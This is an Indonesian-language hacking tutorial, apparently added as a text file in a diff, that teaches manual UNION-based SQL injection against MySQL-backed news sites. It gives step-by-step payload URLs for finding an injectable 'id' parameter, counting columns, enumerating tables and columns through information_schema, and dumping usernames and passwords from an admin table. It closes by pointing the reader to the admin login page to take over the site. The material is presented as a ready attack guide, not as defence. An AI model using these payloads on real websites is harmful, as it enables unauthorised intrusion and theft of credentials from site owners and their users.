@@ -1,0 +1,135 @@
+[+] Author	: Gonzhack
+[+] Homepage	: http://www.indonesiancoder.com
+
+Pengertian sql injection:
+SQL injection adalah sebuah aksi hacking yang dilakukan di aplikasi client dengan cara memodifikasi perintah SQL yang ada di memori aplikasi clien dan juga merupakan teknik mengeksploitasi web aplikasi yang didalamnya menggunakan database untuk penyimpanan data.
+
+Yang perlu di ketahui sebelum sql injection pada mysql:
+karakter: ' atau -
+comments: /* atau --
+information_schema untuk versi: mysql versi 5.x , tidak support untuk mysql versi 4.x
+
+===========
+=step Satu:=
+===========
+
+carilah target
+misal: [site]/berita.php?id=100
+
+Tambahkan karakter ' pada akhir url atau menambahkan karakter "-" untuk melihat apakah ada pesan error.
+contoh: [site]/berita.php?id=100' atau
+[site]/berita.php?id=-100
+
+sehingga muncul pesan error seperti berikut (masih bnyak lagi):
+
+
+==========
+=step Dua:=
+==========
+
+mencari dan menghitung jumlah table yang ada dalam databasenya...
+gunakan perintah : order by
+
+contoh: [site]/berita.php?id=-100+order+by+1-- atau
+[site]/berita.php?id=-100+order+by+1/*
+
+ceklah secara step by step (satupersatu)...
+misal: [site]/berita.php?id=-100+order+by+1--
+[site]/berita.php?id=-100+order+by+2--
+[site]/berita.php?id=-100+order+by+3--
+[site]/berita.php?id=-100+order+by+4--
+
+sehingga muncul error atau hilang pesan error...
+misal: [site]/berita.php?id=-100+order+by+9--
+
+berarti yang kita ambil adalah sampai angka 8
+menjadi [site]/berita.php?id=-100+order+by+8--
+
+
+===========
+=step Tiga:=
+===========
+
+untuk mengeluarkan angka berapa yang muncul gunakan perintah union
+karena tadi error sampai angka 9
+maka: [site]/berita.php?id=-100+union+select+1,2,3,4,5,6,7,8--
+
+ok seumpama yg keluar angka 5
+
+gunakan perintah version() atau @@version untuk mengecek versi sql yg diapakai masukan perintah tsb pada nagka yg keluar tadi
+misal: [site]/berita.php?id=-100+union+select+1,2,3,4,version(),6,7,8-- atau
+[site]/berita.php?id=-100+union+select+1,2,3,4,@@version,6,7,8--
+
+lihat versi yg digunakan seumpama versi 4 tinggalkan saja karena dalam ver 4 ini kita harus menebak sendiri table n column yg ada pada web tersebut karena tidak bisa menggunakan perintah From+Information_schema..
+
+untuk versi 5 berarti anda beruntung tak perlu menebak table n column seperti ver 4 karena di ver 5 ini bisa menggunakan perintah From+Information_schema..
+
+
+============
+=step Empat:=
+============
+
+untuk menampilkan table yg ada pada web tsb adalah
+perintah table_name >>> dimasukan pada angka yg keluar tadi
+perintah +from+information_schema.tables/* >>> dimasukan setelah angka terakhir
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,table_name,6,7,8+from+information_schema.tables--
+
+seumpama table yang muncul adalah "admin"
+
+
+===========
+=step Lima:=
+===========
+
+untuk menampilkan semua isi dari table tsb adalah
+perintah group_concat(table_name) >>> dimasukan pada angka yg keluar tadi
+perintah +from+information_schema.tables+where+table_schema=database() >>> dimasukan setelah angka terakhir
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,group_concat(table_name),6,7,8+from+information_schema.tables+where+table_schema=database()--
+
+
+=============
+= step Enam: =
+=============
+
+perintah group_concat(column_name) >>> dimasukan pada angka yg keluar tadi
+perintah +from+information_schema.columns+where+table_name=0xhexa-- >>> dimasukan setelah angka terakhir
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,group_concat(column_name),6,7,8+from+information_schema.columns+where+table_name=0xhexa--
+
+pada tahap ini kamu wajib mengextrak kata pada isi table menjadi hexadecimal yaitu dengan cara mengkonversinya
+website yg digunakan untuk konversi :
+
+www.ascii-convert.co.cc
+
+contoh kata yg ingin di konversi yaitu admin maka akan menjadi 61646D696E
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,group_concat(column_name),6,7,8+from+information_schema.columns+where+table_name=0x61646D696E--
+
+
+============
+=step Tujuh:=
+============
+
+memunculkan apa yg tadi telah dikeluarkan dari table yaitu dengan cara
+
+perintah concat_ws(0x3a,hasil isi column yg mau dikeluarkan) >>> dimasukan pada angka yg keluar tadi
+perintah +from+(nama table berasal) >>> dimasukan setelah angka terakhir
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,concat_ws(0x3a,hasil isi column),6,7,8+from+(nama table berasal)--
+
+
+contoh kata yang keluar adalah id,username,password
+
+[site]/berita.php?id=-100+union+select+1,2,3,4,concat_ws(0x3a,id,username,password),6,7,8+from+admin--
+
+
+
+==============
+= step Delapan:=
+==============
+
+tahap terakhir mencari halam admin atau login
+
+selanjutnya terserah anda karena kekuasaan web ada di tangan anda...
